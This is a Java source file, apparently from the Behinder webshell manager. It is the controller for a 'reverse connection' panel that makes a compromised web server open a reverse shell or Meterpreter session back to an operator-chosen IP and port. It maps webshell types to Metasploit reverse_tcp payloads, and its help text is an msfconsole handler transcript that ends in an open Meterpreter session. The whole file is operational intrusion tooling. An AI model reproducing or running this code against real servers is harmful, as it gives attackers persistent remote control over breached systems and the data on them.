package net.rebeyond.behinder.ui.controller;

import java.io.ByteArrayInputStream;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import javafx.application.Platform;
import javafx.beans.value.ChangeListener;
import javafx.beans.value.ObservableValue;
import javafx.fxml.FXML;
import javafx.scene.control.Button;
import javafx.scene.control.Label;
import javafx.scene.control.RadioButton;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import javafx.scene.control.Toggle;
import javafx.scene.control.ToggleGroup;
import javafx.scene.image.Image;
import javafx.scene.image.ImageView;
import net.rebeyond.behinder.core.ShellService;
import net.rebeyond.behinder.dao.ShellManager;
import net.rebeyond.behinder.utils.Utils;
import org.json.JSONObject;

public class ReverseViewController {
   private ShellManager shellManager;
   @FXML
   private TextField reverseIPText;
   @FXML
   private TextField reversePortText;
   @FXML
   private RadioButton reverseTypeMeterRadio;
   @FXML
   private RadioButton reverseTypeShellRadio;
   @FXML
   private RadioButton reverseTypeColbatRadio;
   @FXML
   private Button reverseButton;
   @FXML
   private TextArea reverseHelpTextArea;
   private ShellService currentShellService;
   private JSONObject shellEntity;
   private List workList;
   private Label statusLabel;
   private String helpContentTemplate = "root@silver:/tmp# msfconsole\r\nmsf > use exploit/multi/handler \r\nmsf exploit(multi/handler) > set payload %s\r\npayload => %s\r\nmsf exploit(multi/handler) > show options\r\n\r\nPayload options (%s):\r\n\r\n   Name   Current Setting  Required  Description\r\n   ----   ---------------  --------  -----------\r\n   LHOST                   yes       The listen address (an interface may be specified)\r\n   LPORT  4444             yes       The listen port\r\n\r\n\r\nExploit target:\r\n\r\n   Id  Name\r\n   --  ----\r\n   0   Wildcard Target\r\n\r\n\r\nmsf exploit(multi/handler) > set lhost 0.0.0.0\r\nlhost => 0.0.0.0\r\nmsf exploit(multi/handler) > exploit \r\n\r\n[*] Started reverse TCP handler on 0.0.0.0:4444 \r\n[*] Sending stage (53859 bytes) to 119.3.72.174\r\n[*] Meterpreter session 1 opened (192.168.0.166:4444 -> 119.3.72.174:47157) at 2018-08-23 11:03:41 +0800\r\n\r\nmeterpreter > ";
   private Map payloadList;

   public void init(ShellService shellService, List workList, Label statusLabel) {
      this.currentShellService = shellService;
      this.shellEntity = shellService.getShellEntity();
      this.workList = workList;
      this.statusLabel = statusLabel;
      this.initReverseView();
   }

   private void initPayloadList() {
      Map payloadList = new HashMap();
      Map meterPayloadList = new HashMap();
      meterPayloadList.put("jsp", "java/meterpreter/reverse_tcp");
      meterPayloadList.put("php", "php/meterpreter/reverse_tcp");
      meterPayloadList.put("aspx", "windows/meterpreter/reverse_tcp");
      payloadList.put("meter", meterPayloadList);
      Map shellPayloadList = new HashMap();
      shellPayloadList.put("jsp", "java/jsp_shell_reverse_tcp");
      shellPayloadList.put("php", "php/reverse_php");
      shellPayloadList.put("aspx", "windows/shell/reverse_tcp");
      payloadList.put("shell", shellPayloadList);
      this.payloadList = payloadList;
   }

   private void initReverseView() {
      this.initPayloadList();
      this.initHelpContent();
      ToggleGroup radioGroup = new ToggleGroup();
      this.reverseTypeMeterRadio.setToggleGroup(radioGroup);
      this.reverseTypeShellRadio.setToggleGroup(radioGroup);
      this.reverseTypeColbatRadio.setToggleGroup(radioGroup);
      this.reverseTypeMeterRadio.setUserData("meter");
      this.reverseTypeShellRadio.setUserData("shell");
      this.reverseTypeColbatRadio.setUserData("colbat");
      radioGroup.selectedToggleProperty().addListener(new ChangeListener<Toggle>() {
         public void changed(ObservableValue observable, Toggle oldValue, Toggle newValue) {
            String reverseType = newValue.getUserData().toString();
            ReverseViewController.this.updateHelpContent(reverseType);
         }
      });
      radioGroup.selectToggle(this.reverseTypeShellRadio);

      try {
         ImageView icon = new ImageView();
         icon.setImage(new Image(new ByteArrayInputStream(Utils.getResourceData("net/rebeyond/behinder/resource/reverse.png"))));
         icon.setFitHeight(14.0D);
         icon.setPreserveRatio(true);
         this.reverseButton.setGraphic(icon);
      } catch (Exception var3) {
      }

      this.reverseButton.setOnAction((event) -> {
         Runnable runner = () -> {
            try {
               String targetIP = this.reverseIPText.getText();
               String targetPort = this.reversePortText.getText();
               RadioButton currentTypeRadio = (RadioButton)radioGroup.getSelectedToggle();
               if (currentTypeRadio == null) {
                  Platform.runLater(() -> {
                     this.statusLabel.setText("请先选择反弹类型。");
                  });
                  return;
               }

               String type = currentTypeRadio.getUserData().toString();
               JSONObject resultObj = this.currentShellService.connectBack(type, targetIP, targetPort);
               String status = resultObj.getString("status");
               if (status.equals("fail")) {
                  Platform.runLater(() -> {
                     String msg = resultObj.getString("msg");
                     this.statusLabel.setText("反弹失败:" + msg);
                  });
               } else {
                  Platform.runLater(() -> {
                     this.statusLabel.setText("反弹成功。");
                  });
               }
            } catch (Exception var8) {
               var8.printStackTrace();
               Platform.runLater(() -> {
                  this.statusLabel.setText("操作失败:" + var8.getMessage());
               });
            }

         };
         Thread worker = new Thread(runner);
         this.workList.add(worker);
         worker.start();
      });
   }

   private void initHelpContent() {
      this.reverseHelpTextArea.setText("root@silver:/tmp# msfconsole\r\nmsf > use exploit/multi/handler \r\nmsf exploit(multi/handler) > set payload %s\r\npayload => %s\r\nmsf exploit(multi/handler) > show options\r\n\r\nPayload options (%s):\r\n\r\n   Name   Current Setting  Required  Description\r\n   ----   ---------------  --------  -----------\r\n   LHOST                   yes       The listen address (an interface may be specified)\r\n   LPORT  4444             yes       The listen port\r\n\r\n\r\nExploit target:\r\n\r\n   Id  Name\r\n   --  ----\r\n   0   Wildcard Target\r\n\r\n\r\nmsf exploit(multi/handler) > set lhost 0.0.0.0\r\nlhost => 0.0.0.0\r\nmsf exploit(multi/handler) > exploit \r\n\r\n[*] Started reverse TCP handler on 0.0.0.0:4444 \r\n[*] Sending stage (53859 bytes) to 119.3.72.174\r\n[*] Meterpreter session 1 opened (192.168.0.166:4444 -> 119.3.72.174:47157) at 2018-08-23 11:03:41 +0800\r\n\r\nmeterpreter > ");
   }

   private void updateHelpContent(String reverseType) {
      String shellType = this.shellEntity.getString("type");
      String payloadName = (String)((Map)this.payloadList.get(reverseType)).get(shellType);
      String helpContent = String.format(this.helpContentTemplate, payloadName, payloadName, payloadName);
      this.reverseHelpTextArea.setText(helpContent);
   }
}
